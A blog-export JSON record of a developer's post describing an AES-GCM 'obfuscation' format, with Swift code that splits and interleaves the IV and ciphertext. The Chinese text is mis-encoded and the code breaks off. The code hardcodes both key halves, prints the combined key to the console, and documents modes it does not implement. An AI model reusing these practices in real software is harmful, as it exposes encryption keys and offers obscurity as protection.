{"meta":{"title":"M Study Log","subtitle":"","description":"","author":"m","url":"https://banjinmei.github.io","root":"/"},"pages":[],"posts":[{"title":"AES Obfuscation","slug":"AES-Obfuscation","date":"2025-03-16T17:49:45.000Z","updated":"2025-03-16T17:52:30.589Z","comments":true,"path":"2025/03/17/AES-Obfuscation/","permalink":"https://banjinmei.github.io/2025/03/17/AES-Obfuscation/","excerpt":"","text":"AES åŠ å¯†æ··æ·†ç®—æ³•è¯´æ˜ (æœåŠ¡å™¨ç«¯è§£å¯†æŒ‡å—) 1. æ•°æ®ç»“æ„ åŠ å¯†åæ•°æ®æ ¼å¼ (Base64ç¼–ç ): [å¤´éƒ¨ä¿¡æ¯][æ··æ·†æ•°æ®] å¤´éƒ¨ä¿¡æ¯ (7å­—èŠ‚): æœ¬åœ°å¯†é’¥ç‰ˆæœ¬ (2å­—èŠ‚, å¤§ç«¯åº) æœåŠ¡å™¨å¯†é’¥ç‰ˆæœ¬ (2å­—èŠ‚, å¤§ç«¯åº) æ··æ·†ç±»å‹ (1å­—èŠ‚)ï¼š0&#x3D;æ ‡å‡†æ¨¡å¼, 1&#x3D;å¢å¼ºæ¨¡å¼, 2&#x3D;ç¿»è½¬æ¨¡å¼, 3&#x3D;éšæœºæ¨¡å¼ åˆ†æ®µç±»å‹ (1å­—èŠ‚)ï¼š0&#x3D;æ ‡å‡†åˆ†æ®µ, 1&#x3D;ä¸‰ç­‰åˆ† æ“ä½œç±»å‹ (1å­—èŠ‚)ï¼šä½æ©ç ï¼Œç”¨äºéšæœºæ¨¡å¼ 0x01: ä½ç§»æ“ä½œ 0x02: å¼‚æˆ–æ“ä½œ 0x04: ç¿»è½¬æ“ä½œ 0x08: äº¤æ¢æ“ä½œ 2. åˆ†æ®µæ¨¡å¼ æ ‡å‡†åˆ†æ®µ (SegmentationType.standard): IVåˆ†ä¸º3æ®µ: [6å­—èŠ‚]-[4å­—èŠ‚]-[6å­—èŠ‚] å¯†æ–‡åˆ†ä¸º2æ®µ: [å‰åŠéƒ¨åˆ†(N+1)&#x2F;2å­—èŠ‚]-[ååŠéƒ¨åˆ†N&#x2F;2å­—èŠ‚] ä¸‰ç­‰åˆ† (SegmentationType.tripartite): IVåˆ†ä¸º4æ®µ: [4å­—èŠ‚]-[4å­—èŠ‚]-[4å­—èŠ‚]-[4å­—èŠ‚] å¯†æ–‡åˆ†ä¸º3æ®µ: [ç¬¬1æ®µ]-[ç¬¬2æ®µ]-[ç¬¬3æ®µ] 3. æ•°æ®æ’åˆ— æ ‡å‡†åˆ†æ®µæ¨¡å¼: [IVæ®µ1][å¯†æ–‡æ®µ1][IVæ®µ2][å¯†æ–‡æ®µ2][IVæ®µ3] ä¸‰ç­‰åˆ†æ¨¡å¼: [IVæ®µ1][å¯†æ–‡æ®µ1][IVæ®µ2][å¯†æ–‡æ®µ2][IVæ®µ3][å¯†æ–‡æ®µ3][IVæ®µ4] 4. æ··æ·†å¤„ç† æ ‡å‡†æ¨¡å¼ (standard): æ— é¢å¤–æ··æ·†ï¼Œä»…è¿›è¡Œåˆ†æ®µå­˜å‚¨ å¢å¼ºæ¨¡å¼ (enhanced): å¯¹å¯†æ–‡è¿›è¡Œå¾ªç¯ä½ç§»å’Œå¼‚æˆ–æ“ä½œ ä½ç§»é‡ &#x3D; æ“ä½œç±»å‹å€¼ % 8 å¼‚æˆ–å¯†é’¥ &#x3D; 0xA5 ç¿»è½¬æ¨¡å¼ (reversed): å°†æ¯ä¸ªIVæ®µå’Œå¯†æ–‡æ®µè¿›è¡Œå­—èŠ‚åè½¬ éšæœºæ¨¡å¼ (random): éšæœºç»„åˆ1-3ç§æ“ä½œï¼šä½ç§»ã€å¼‚æˆ–ã€ç¿»è½¬ã€äº¤æ¢ å…·ä½“æ“ä½œç”±æ“ä½œç±»å‹å­—èŠ‚å†³å®š 5. è§£å¯†æ­¥éª¤ Base64è§£ç  è¯»å–å¤´éƒ¨ä¿¡æ¯(7å­—èŠ‚) æ ¹æ®åˆ†æ®µç±»å‹æå–IVå’Œå¯†æ–‡æ®µ æ ¹æ®æ··æ·†ç±»å‹è¿›è¡Œç›¸åº”çš„åæ··æ·†æ“ä½œ åˆå¹¶IVå’Œå¯†æ–‡æ®µ ä½¿ç”¨AES-GCMæ¨¡å¼è§£å¯† å¯†é’¥é•¿åº¦ï¼š32å­—èŠ‚ IVé•¿åº¦ï¼š16å­—èŠ‚ è®¤è¯æ ‡ç­¾ï¼šåŒ…å«åœ¨å¯†æ–‡ä¸­(combinedæ¨¡å¼) æ³¨æ„äº‹é¡¹ï¼š æ‰€æœ‰æ•°å­—ç±»å‹å‡é‡‡ç”¨å¤§ç«¯åº å¯†æ–‡å¯èƒ½ä¸æ˜¯3çš„å€æ•°ï¼Œéœ€è¦æ­£ç¡®å¤„ç†ä½™æ•° æ ‡å‡†åˆ†æ®µæ¨¡å¼ä¸‹ï¼Œå¯†æ–‡å‰åŠéƒ¨åˆ†å¯èƒ½æ¯”ååŠéƒ¨åˆ†å¤š1ä¸ªå­—èŠ‚ ç¡®ä¿æœåŠ¡å™¨å¯†é’¥ç‰ˆæœ¬ä¸å®¢æˆ·ç«¯ä¸€è‡´ swift123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627import CryptoSwiftimport Foundation/* å®‰å…¨æ€§ï¼š IVè¢«åˆ†æˆä¸‰éƒ¨åˆ†ï¼ˆ6-4-6å­—èŠ‚ï¼‰ï¼Œå¢åŠ äº†ç ´è§£éš¾åº¦ å¯†æ–‡è¢«åˆ†æˆä¸¤åŠï¼Œå¹¶ä¸”å’ŒIVéƒ¨åˆ†äº¤é”™å­˜æ”¾ æ·»åŠ äº†éšæœºå¡«å……ï¼Œæ¯æ¬¡åŠ å¯†ç»“æœéƒ½ä¸åŒ ä½¿ç”¨äº†GCMæ¨¡å¼çš„è®¤è¯åŠ å¯†ï¼Œå¯ä»¥éªŒè¯æ•°æ®å®Œæ•´æ€§ ç»“æ„è®¾è®¡ï¼š [æœ¬åœ°] [æœ¬åœ°å¯†é’¥ç‰ˆæœ¬2å­—èŠ‚][æœåŠ¡å™¨å¯†é’¥ç‰ˆæœ¬2å­—èŠ‚][æ··æ·†ç±»å‹1å­—èŠ‚][åˆ†æ®µç±»å‹1å­—èŠ‚][IVåˆ†æ®µ][å¯†æ–‡åˆ†æ®µ] æ³¨æ„: è¿™é‡Œå¦‚æœå¯†æ–‡é•¿åº¦ä¸ºå¥‡æ•°, åˆ™å¯†æ–‡å‰åŠéƒ¨åˆ†ä¼šå¤šä¸€ä¸ªå­—èŠ‚, ååŠéƒ¨åˆ†ä¼šå°‘ä¸€ä¸ªå­—èŠ‚ - æ•°æ®åˆ†å¸ƒå‡åŒ€ å…³é”®æ•°æ®ï¼ˆIVå’Œå¯†æ–‡ï¼‰è¢«åˆ†æ•£å­˜å‚¨ ç»“æ„æ¸…æ™°ä½†ä¸æ˜“è¢«è¯†åˆ« ä»£ç å®ç°ï¼š é€»è¾‘æ¸…æ™°ï¼Œæ˜“äºç»´æŠ¤ é”™è¯¯å¤„ç†å®Œå–„ æœ‰è¯¦ç»†çš„æ³¨é‡Šè¯´æ˜ æä¾›äº†æµ‹è¯•æ–¹æ³• æ€§èƒ½ï¼š æ²¡æœ‰å¤æ‚çš„è®¡ç®— åªè¿›è¡Œå¿…è¦çš„æ•°ç»„æ“ä½œ å†…å­˜ä½¿ç”¨åˆç† */@available(iOS 13.0, macOS 10.15, *)public final class AESObfuscation: @unchecked Sendable &#123; /// æ··æ·†æ¨¡å¼ public enum ObfuscationType: UInt8, CaseIterable &#123; /// æ ‡å‡†æ¨¡å¼ï¼šæ— é¢å¤–æ··æ·†æ“ä½œ case standard = 0 /// å¢å¼ºæ¨¡å¼ï¼šå¢åŠ ä½ç§»å’Œå¼‚æˆ–æ“ä½œ case enhanced = 1 /// ç¿»è½¬æ¨¡å¼ï¼šå¯¹æ•°æ®å—è¿›è¡Œç¿»è½¬ case reversed = 2 &#125; /// åˆ†æ®µå­˜å‚¨æ¨¡å¼ public enum SegmentationType: UInt8, CaseIterable &#123; /// æ ‡å‡†åˆ†æ®µï¼šIV(6-4-6) case standard = 0 /// ä¸‰ç­‰åˆ†ï¼šIV(4-4-4-4) case tripartite = 1 &#125; /// åˆ†æ®µæ¨¡å¼é…ç½® private struct SegmentConfig &#123; /// IVåˆ†æ®µé•¿åº¦ let ivSegments: [Int] /// å¯†æ–‡åˆ†æ®µæ•°é‡ let ciphertextParts: Int static func config(for type: SegmentationType) -&gt; SegmentConfig &#123; switch type &#123; case .standard: return SegmentConfig(ivSegments: [6, 4, 6], ciphertextParts: 2) case .tripartite: return SegmentConfig(ivSegments: [4, 4, 4, 4], ciphertextParts: 3) &#125; &#125; &#125; /// å½“å‰æ··æ·†æ¨¡å¼ private var obfuscationType: ObfuscationType = .standard /// å½“å‰åˆ†æ®µæ¨¡å¼ private var segmentationType: SegmentationType = .standard /// è·å–å½“å‰åˆ†æ®µé…ç½® private var currentSegmentConfig: SegmentConfig &#123; return SegmentConfig.config(for: segmentationType) &#125; /// æ··æ·†æ“ä½œç±»å‹ private struct ObfuscationOperation: OptionSet &#123; let rawValue: UInt8 static let none = ObfuscationOperation([]) // æ— æ“ä½œ static let shift = ObfuscationOperation(rawValue: 1 &lt;&lt; 0) // ä½ç§»æ“ä½œ static let xor = ObfuscationOperation(rawValue: 1 &lt;&lt; 1) // å¼‚æˆ–æ“ä½œ // è·å–å·²å¯ç”¨çš„æ“ä½œåˆ—è¡¨ var enabledOperations: [ObfuscationOperation] &#123; var ops: [ObfuscationOperation] = [] if contains(.shift) &#123; ops.append(.shift) &#125; if contains(.xor) &#123; ops.append(.xor) &#125; return ops &#125; &#125; /// å½“å‰æ··æ·†æ“ä½œ private var currentOperations: ObfuscationOperation = [] /// æœ¬åœ°å¯†é’¥éƒ¨åˆ† private var localKey: [UInt8] /// æœåŠ¡å™¨å¯†é’¥éƒ¨åˆ† private var serverKey: [UInt8] /// æœ¬åœ°å¯†é’¥ç‰ˆæœ¬ private var localKeyVersion: UInt16 = 1 /// æœåŠ¡å™¨å¯†é’¥ç‰ˆæœ¬ private var serverKeyVersion: UInt16 = 1 private let queue = DispatchQueue(label: &quot;com.yjsocketclient.aes.obfuscation&quot;, qos: .userInitiated) // MARK: - å•ä¾‹ /// å…±äº«å®ä¾‹ public static let shared = AESObfuscation() /// åˆå§‹åŒ–ç±» private init() &#123; // è¿™é‡Œå…ˆä½¿ç”¨å›ºå®šå€¼ï¼Œå®é™…åº”ç”¨ä¸­åº”è¯¥ä»å®‰å…¨å­˜å‚¨ä¸­è¯»å– self.localKey = Array(&quot;o44900ba7661ffb1&quot;.utf8) // ç¡®ä¿16å­—èŠ‚ self.serverKey = Array(&quot;5dPAed6aa7608596&quot;.utf8) // ç¡®ä¿16å­—èŠ‚ // éªŒè¯å¯†é’¥é•¿åº¦ assert(localKey.count == 16, &quot;æœ¬åœ°å¯†é’¥å¿…é¡»ä¸º16å­—èŠ‚&quot;) assert(serverKey.count == 16, &quot;æœåŠ¡å™¨å¯†é’¥å¿…é¡»ä¸º16å­—èŠ‚&quot;) assert(key.count == 32, &quot;ç»„åˆå¯†é’¥å¿…é¡»ä¸º32å­—èŠ‚&quot;) &#125; /// æ›´æ–°æœåŠ¡å™¨å¯†é’¥ /// - Parameters: /// - newKey: æ–°çš„æœåŠ¡å™¨å¯†é’¥ /// - version: æ–°çš„æœåŠ¡å™¨å¯†é’¥ç‰ˆæœ¬ public func updateServerKey(_ newKey: [UInt8], version: UInt16) &#123; queue.sync &#123; assert(newKey.count == 16, &quot;æœåŠ¡å™¨å¯†é’¥å¿…é¡»ä¸º16å­—èŠ‚&quot;) self.serverKey = newKey self.serverKeyVersion = version &#125; &#125; /// æ›´æ–°æœåŠ¡å™¨å¯†é’¥ /// - Parameters: /// - newKey: æ–°çš„æœåŠ¡å™¨å¯†é’¥ /// - version: æ–°çš„æœåŠ¡å™¨å¯†é’¥ç‰ˆæœ¬ public func updateServerKey(_ newKey: String, version: UInt16) &#123; let key = Array(newKey.utf8) updateServerKey(key, version: version) &#125; /// æ›´æ–°æœ¬åœ°å¯†é’¥ /// - Parameters: /// - newKey: æ–°çš„æœ¬åœ°å¯†é’¥ /// - version: æ–°çš„æœ¬åœ°å¯†é’¥ç‰ˆæœ¬ public func updateLocalKey(_ newKey: [UInt8], version: UInt16) &#123; queue.sync &#123; assert(newKey.count == 16, &quot;æœ¬åœ°å¯†é’¥å¿…é¡»ä¸º216èŠ‚&quot;) self.localKey = newKey self.localKeyVersion = version &#125; &#125; /// è·å–å®Œæ•´çš„å¯†é’¥ private var key: [UInt8] &#123; let combinedKey = localKey + serverKey assert(combinedKey.count == 32, &quot;ç»„åˆå¯†é’¥å¿…é¡»ä¸º32å­—èŠ‚&quot;) return combinedKey &#125; // MARK: - é™æ€æ–¹æ³• /// é™æ€åŠ å¯†æ–¹æ³• /// - Parameters: /// - content: éœ€è¦åŠ å¯†çš„å†…å®¹ /// - obfuscationType: æ··æ·†ç±»å‹ï¼Œé»˜è®¤ä¸ºæ ‡å‡†æ¨¡å¼ /// - segmentationType: åˆ†æ®µç±»å‹ï¼Œé»˜è®¤ä¸ºæ ‡å‡†æ¨¡å¼ /// - Returns: åŠ å¯†åçš„Base64å­—ç¬¦ä¸² public static func encrypt(_ content: String, obfuscationType: ObfuscationType = .standard, segmentationType: SegmentationType = .standard) -&gt; String? &#123; guard !content.isEmpty else &#123; return nil &#125; return shared.queue.sync &#123; shared.obfuscationType = obfuscationType shared.segmentationType = segmentationType return shared.encrypt(content: content) &#125; &#125; /// éšæœºæ··æ·†ç±»å‹, ä»¥åŠéšæœºåˆ†æ®µç±»å‹ åŠ å¯† public static func randomObfuscationTypeAndSegmentationTypeEncrypt(_ content: String) -&gt; String? &#123; let obfuscationType = ObfuscationType.allCases.randomElement() ?? .standard let segmentationType = SegmentationType.allCases.randomElement() ?? .standard return Self.encrypt(content, obfuscationType: obfuscationType, segmentationType: segmentationType) &#125; /// é™æ€è§£å¯†æ–¹æ³• /// - Parameter encryptedString: åŠ å¯†åçš„Base64å­—ç¬¦ä¸² /// - Returns: è§£å¯†åçš„æ˜æ–‡ public static func decrypt(_ encryptedString: String) -&gt; String? &#123; guard !encryptedString.isEmpty else &#123; return nil &#125; return shared.queue.sync &#123; shared.decrypt(encryptedString: encryptedString) &#125; &#125; /// åŠ å¯†å¹¶æ··æ·†æ•°æ® /// - Parameter content: æ˜æ–‡å†…å®¹ /// - Returns: æ··æ·†åçš„åŠ å¯† Base64 å­—ç¬¦ä¸² func encrypt(content: String) -&gt; String? &#123; do &#123; // è½¬æ¢æ˜æ–‡ä¸ºå­—èŠ‚ let plaintext = Array(content.utf8) // ç”Ÿæˆéšæœº IV let iv = AES.randomIV(AES.blockSize) // åŠ å¯†æ˜æ–‡ let gcm = GCM(iv: iv, mode: .combined) // ä½¿ç”¨combinedæ¨¡å¼ï¼Œå°†è®¤è¯æ ‡ç­¾é™„åŠ åˆ°å¯†æ–‡ let aes = try AES(key: key, blockMode: gcm, padding: .noPadding) let ciphertext = try aes.encrypt(plaintext) // å°† UInt8 æ•°ç»„è½¬æ¢ä¸º Data let data = Data(key) // å°† Data è½¬æ¢ä¸ºå­—ç¬¦ä¸² if let string = String(data: data, encoding: .utf8) &#123; print(&quot;è½¬æ¢åçš„å­—ç¬¦ä¸²: \\(string)&quot;) // è¾“å‡º: è½¬æ¢åçš„å­—ç¬¦ä¸²: Hello &#125; else &#123; print(&quot;è½¬æ¢å¤±è´¥&quot;) &#125; // å°† UInt8 æ•°ç»„è½¬æ¢ä¸º Data let localData = Data(localKey) // å°† Data è½¬æ¢ä¸ºå­—ç¬¦ä¸² if let localString = String(data: localData, encoding: .utf8) &#123; print(&quot;è½¬æ¢åçš„å­—ç¬¦ä¸²: \\(localString)&quot;) // è¾“å‡º: è½¬æ¢åçš„å­—ç¬¦ä¸²: Hello &#125; else &#123; print(&quot;è½¬æ¢å¤±è´¥&quot;) &#125;#if os(iOS) print(&quot;åŠ å¯† iv: \\(iv)&quot;) print(&quot;åŠ å¯†å¯†æ–‡: \\(ciphertext)&quot;)#endif // æ··æ·† let obfuscated = obfuscate(iv: iv, ciphertext: ciphertext) // è¿”å› Base64 ç¼–ç å­—ç¬¦ä¸² return obfuscated.base64EncodedString() &#125; catch &#123; print(&quot;Encryption failed: \\(error)&quot;) return nil &#125; &#125; /// è§£æ··æ·†å¹¶è§£å¯†æ•°æ® /// - Parameter encryptedString: æ··æ·†åçš„åŠ å¯† Base64 å­—ç¬¦ä¸² /// - Returns: è§£å¯†åçš„æ˜æ–‡å­—ç¬¦ä¸² func decrypt(encryptedString: String) -&gt; String? &#123; guard let encryptedData = Data(base64Encoded: encryptedString) else &#123; print(&quot;Invalid Base64 string&quot;) return nil &#125; // è¯»å–æ··æ·†ç±»å‹å’Œåˆ†æ®µç±»å‹ guard encryptedData.count &gt; 4 else &#123; return nil &#125; let obfuscationType = ObfuscationType(rawValue: encryptedData[4]) ?? .standard let segmentationType = SegmentationType(rawValue: encryptedData[5]) ?? .standard self.obfuscationType = obfuscationType self.segmentationType = segmentationType // print(&quot;è§£å¯†æ··æ·†ç±»å‹: \\(obfuscationType)&quot;)// print(&quot;è§£å¯†åˆ†æ®µç±»å‹: \\(segmentationType)&quot;) // å»æ··æ·† guard let (iv, ciphertext) = deobfuscate(data: encryptedData) else &#123; print(&quot;Deobfuscation failed&quot;) return nil &#125;// print(&quot;è§£å¯† iv: \\(iv)&quot;)// print(&quot;è§£å¯†å¯†æ–‡: \\(ciphertext)&quot;) do &#123; // è§£å¯† let gcm = GCM(iv: iv, mode: .combined) // ä½¿ç”¨combinedæ¨¡å¼ï¼Œè®¤è¯æ ‡ç­¾åŒ…å«åœ¨å¯†æ–‡ä¸­ let aes = try AES(key: key, blockMode: gcm, padding: .noPadding) let plaintext = try aes.decrypt(ciphertext) // è½¬æ¢ä¸ºå­—ç¬¦ä¸² return String(bytes: plaintext, encoding: .utf8) &#125; catch &#123; print(&quot;Decryption failed: \\(error)&quot;) return nil &#125; &#125; // MARK: - æ··æ·†å’Œå»æ··æ·† /// ç›´æ¥å­˜å‚¨ç‰ˆæœ¬ä¿¡æ¯ï¼ˆ4å­—èŠ‚ï¼‰+ éšæœºå¡«å……ï¼ˆ2å­—èŠ‚ï¼‰ /// æ··æ·†åŠ å¯†ç»“æœ private func obfuscate(iv: [UInt8], ciphertext: [UInt8]) -&gt; Data &#123; // ç‰ˆæœ¬ä¿¡æ¯ï¼ˆ4å­—èŠ‚ï¼‰+ æ··æ·†ç±»å‹ï¼ˆ1å­—èŠ‚ï¼‰+ åˆ†æ®µç±»å‹ï¼ˆ1å­—èŠ‚ï¼‰+ æ“ä½œç±»å‹ï¼ˆ1å­—èŠ‚ï¼‰ var versionedFill = Data() withUnsafeBytes(of: localKeyVersion.bigEndian) &#123; versionedFill.append(contentsOf: $0) &#125; withUnsafeBytes(of: serverKeyVersion.bigEndian) &#123; versionedFill.append(contentsOf: $0) &#125; versionedFill.append(obfuscationType.rawValue) // æ··æ·†ç±»å‹ versionedFill.append(segmentationType.rawValue) // åˆ†æ®µç±»å‹ versionedFill.append(currentOperations.rawValue) // æ“ä½œç±»å‹ // æ ¹æ®åˆ†æ®µæ¨¡å¼åˆ†å‰²IVå’Œå¯†æ–‡ let segmentMode = currentSegmentConfig.ivSegments var ivParts: [[UInt8]] = [] var currentIndex = 0 for length in segmentMode &#123; let endIndex = min(currentIndex + length, iv.count) ivParts.append(Array(iv[currentIndex..&lt;endIndex])) currentIndex = endIndex &#125; // åˆ†å‰²å¯†æ–‡ let ciphertextParts: [[UInt8]] if segmentationType == .tripartite &#123; // ä¸‰ç­‰åˆ†å¯†æ–‡ï¼Œç¡®ä¿é•¿åº¦ç›¸ç­‰ let totalLength = ciphertext.count let partLength = totalLength / 3 let remainder = totalLength % 3 var parts: [[UInt8]] = [] var currentIndex = 0 for i in 0..&lt;3 &#123; let extraByte = i &lt; remainder ? 1 : 0 let endIndex = currentIndex + partLength + extraByte parts.append(Array(ciphertext[currentIndex..&lt;endIndex])) currentIndex = endIndex &#125; ciphertextParts = parts &#125; else &#123; // æ ‡å‡†äºŒç­‰åˆ† let halfIndex = (ciphertext.count + 1) / 2 // ç¡®ä¿å‰åŠéƒ¨åˆ†å¤šä¸€ä¸ªå­—èŠ‚ ciphertextParts = [ Array(ciphertext[..&lt;halfIndex]), Array(ciphertext[halfIndex...]) ] &#125; // å¤„ç†å„ä¸ªéƒ¨åˆ† var processedIvParts = ivParts var processedCiphertextParts = ciphertextParts switch obfuscationType &#123; case .enhanced: let shift = Int(currentOperations.rawValue) % 8 processedCiphertextParts = processedCiphertextParts.map &#123; enhanceObfuscate(data: $0, shift: shift) &#125; case .reversed: processedCiphertextParts = processedCiphertextParts.map &#123; Array($0.reversed()) &#125; processedIvParts = processedIvParts.map &#123; Array($0.reversed()) &#125; case .standard: break &#125; // æ‹¼æ¥æ··æ·†åçš„ç»“æ„ var obfuscatedData = versionedFill // äº¤é”™å­˜å‚¨IVå’Œå¯†æ–‡éƒ¨åˆ† if segmentationType == .tripartite &#123; // ä¸‰ç­‰åˆ†æ¨¡å¼çš„å­˜å‚¨é¡ºåºï¼šIV1-å¯†æ–‡1-IV2-å¯†æ–‡2-IV3-å¯†æ–‡3-IV4 for i in 0..&lt;3 &#123; obfuscatedData.append(contentsOf: processedIvParts[i]) obfuscatedData.append(contentsOf: processedCiphertextParts[i]) &#125; obfuscatedData.append(contentsOf: processedIvParts[3]) &#125; else &#123; // æ ‡å‡†æ¨¡å¼çš„å­˜å‚¨é¡ºåºï¼šIV1-å¯†æ–‡1-IV2-å¯†æ–‡2-IV3 obfuscatedData.append(contentsOf: processedIvParts[0]) obfuscatedData.append(contentsOf: processedCiphertextParts[0]) obfuscatedData.append(contentsOf: processedIvParts[1]) obfuscatedData.append(contentsOf: processedCiphertextParts[1]) obfuscatedData.append(contentsOf: processedIvParts[2]) &#125; return obfuscatedData &#125; /// å¢å¼ºæ··æ·†å¤„ç† private func enhanceObfuscate(data: [UInt8], shift: Int) -&gt; [UInt8] &#123; let key: UInt8 = 0xA5 // å›ºå®šå¼‚æˆ–å¯†é’¥ return data.map &#123; byte in // å¾ªç¯å·¦ç§»ä½ let shifted = (byte &lt;&lt; shift) | (byte &gt;&gt; (8 - shift)) // å¼‚æˆ–æ“ä½œ return shifted ^ key &#125; &#125; /// å¢å¼ºæ··æ·†çš„é€†æ“ä½œ private func enhanceDeobfuscate(data: [UInt8], shift: Int) -&gt; [UInt8] &#123; let key: UInt8 = 0xA5 // å›ºå®šå¼‚æˆ–å¯†é’¥ return data.map &#123; byte in // å…ˆå¼‚æˆ– let unxored = byte ^ key // å¾ªç¯å³ç§»ä½ return (unxored &gt;&gt; shift) | (unxored &lt;&lt; (8 - shift)) &#125; &#125; /// å»æ··æ·†æ•°æ® private func deobfuscate(data: Data) -&gt; ([UInt8], [UInt8])? &#123; let versionFillLength = 7 // 4å­—èŠ‚ç‰ˆæœ¬ä¿¡æ¯ + 1å­—èŠ‚æ··æ·†ç±»å‹ + 1å­—èŠ‚åˆ†æ®µç±»å‹ + 1å­—èŠ‚æ“ä½œç±»å‹ // æ ¡éªŒåŸºæœ¬é•¿åº¦ guard data.count &gt; versionFillLength else &#123; return nil &#125; // è¯»å–ç‰ˆæœ¬ä¿¡æ¯ã€æ··æ·†ç±»å‹å’Œåˆ†æ®µç±»å‹ let localKeyVer = data[0..&lt;2].withUnsafeBytes &#123; $0.load(as: UInt16.self).bigEndian &#125; let serverKeyVer = data[2..&lt;4].withUnsafeBytes &#123; $0.load(as: UInt16.self).bigEndian &#125; // éªŒè¯å¯†é’¥ç‰ˆæœ¬ guard localKeyVer == localKeyVersion, serverKeyVer == serverKeyVersion else &#123;// print(&quot;Key version mismatch - Local: \\(localKeyVer) vs \\(localKeyVersion), Server: \\(serverKeyVer) vs \\(serverKeyVersion)&quot;) return nil &#125; obfuscationType = ObfuscationType(rawValue: data[4]) ?? .standard segmentationType = SegmentationType(rawValue: data[5]) ?? .standard currentOperations = ObfuscationOperation(rawValue: data[6]) // è·å–åˆ†æ®µé…ç½® let config = currentSegmentConfig let ivSegments = config.ivSegments // è®¡ç®—IVæ®µçš„æ€»é•¿åº¦ let totalIvLength = ivSegments.reduce(0, +) // æ ¡éªŒå®Œæ•´é•¿åº¦ guard data.count &gt; versionFillLength + totalIvLength else &#123; return nil &#125; // æå–IVå’Œå¯†æ–‡éƒ¨åˆ† var currentPosition = versionFillLength var ivParts: [[UInt8]] = [] var ciphertextParts: [[UInt8]] = [] if segmentationType == .tripartite &#123; // è®¡ç®—æ¯æ®µå¯†æ–‡çš„é•¿åº¦ let remainingLength = data.count - versionFillLength - totalIvLength let basePartLength = remainingLength / 3 let remainder = remainingLength % 3 // æå–ä¸‰ç­‰åˆ†çš„æ•°æ® for i in 0..&lt;3 &#123; // æå–IVéƒ¨åˆ† let ivEnd = currentPosition + ivSegments[i] ivParts.append(Array(data[currentPosition..&lt;ivEnd])) currentPosition = ivEnd // è®¡ç®—å½“å‰éƒ¨åˆ†çš„å®é™…é•¿åº¦ let extraByte = i &lt; remainder ? 1 : 0 let currentPartLength = basePartLength + extraByte // æå–å¯†æ–‡éƒ¨åˆ† let ciphertextEnd = currentPosition + currentPartLength ciphertextParts.append(Array(data[currentPosition..&lt;ciphertextEnd])) currentPosition = ciphertextEnd &#125; // æå–æœ€åä¸€ä¸ªIVéƒ¨åˆ† let lastIvEnd = min(currentPosition + ivSegments[3], data.count) ivParts.append(Array(data[currentPosition..&lt;lastIvEnd])) &#125; else &#123; // æ ‡å‡†äºŒç­‰åˆ†æ¨¡å¼çš„æå–é€»è¾‘ let remainingLength = data.count - versionFillLength - totalIvLength let firstHalfLength = (remainingLength + 1) / 2 // ç¡®ä¿å‰åŠéƒ¨åˆ†å¤šä¸€ä¸ªå­—èŠ‚ let secondHalfLength = remainingLength - firstHalfLength // æå–æ ‡å‡†æ¨¡å¼çš„æ•°æ® // ç¬¬ä¸€éƒ¨åˆ†ï¼šIV1 + å¯†æ–‡1 let firstIvEnd = currentPosition + ivSegments[0] ivParts.append(Array(data[currentPosition..&lt;firstIvEnd])) currentPosition = firstIvEnd let firstCiphertextEnd = currentPosition + firstHalfLength let firstCiphertext = Array(data[currentPosition..&lt;firstCiphertextEnd]) ciphertextParts.append(firstCiphertext) currentPosition = firstCiphertextEnd // ç¬¬äºŒéƒ¨åˆ†ï¼šIV2 + å¯†æ–‡2 let secondIvEnd = currentPosition + ivSegments[1] ivParts.append(Array(data[currentPosition..&lt;secondIvEnd])) currentPosition = secondIvEnd let secondCiphertextEnd = currentPosition + secondHalfLength let secondCiphertext = Array(data[currentPosition..&lt;secondCiphertextEnd]) ciphertextParts.append(secondCiphertext) currentPosition = secondCiphertextEnd // æœ€åä¸€ä¸ªIVéƒ¨åˆ†ï¼šIV3 let lastIvEnd = min(currentPosition + ivSegments[2], data.count) ivParts.append(Array(data[currentPosition..&lt;lastIvEnd])) &#125; // æ‰“å°åˆ†æ®µä¿¡æ¯// print(&quot;åˆ†æ®µå‰ - IVæ®µ: \\(ivParts.map &#123; $0.count &#125;), å¯†æ–‡æ®µ: \\(ciphertextParts.map &#123; $0.count &#125;)&quot;) // å¤„ç†æ··æ·† switch obfuscationType &#123; case .enhanced: let shift = Int(currentOperations.rawValue) % 8 ciphertextParts = ciphertextParts.map &#123; enhanceDeobfuscate(data: $0, shift: shift) &#125; case .reversed: ciphertextParts = ciphertextParts.map &#123; Array($0.reversed()) &#125; ivParts = ivParts.map &#123; Array($0.reversed()) &#125; case .standard: break &#125; // ç»„åˆIVå’Œå¯†æ–‡ let iv = ivParts.reduce([], +) let ciphertext = ciphertextParts.reduce([], +) // print(&quot;åˆ†æ®µå - IVé•¿åº¦: \\(iv.count), å¯†æ–‡é•¿åº¦: \\(ciphertext.count)&quot;) return (iv, ciphertext) &#125; /// è·å–æ“ä½œç±»å‹çš„æè¿° private func getOperationDescription() -&gt; String &#123; var operations: [String] = [] if currentOperations.contains(.shift) &#123; operations.append(&quot;ä½ç§»&quot;) &#125; if currentOperations.contains(.xor) &#123; operations.append(&quot;å¼‚æˆ–&quot;) &#125; return operations.isEmpty ? &quot;æ— æ“ä½œ&quot; : operations.joined(separator: &quot; -&gt; &quot;) &#125; // MARK: - æµ‹è¯•æ–¹æ³• public static func test() &#123; print(&quot;\\n=== å¼€å§‹åŠ è§£å¯†æµ‹è¯• ===\\n&quot;) // æµ‹è¯•æ•°æ® let testCases: [(String, 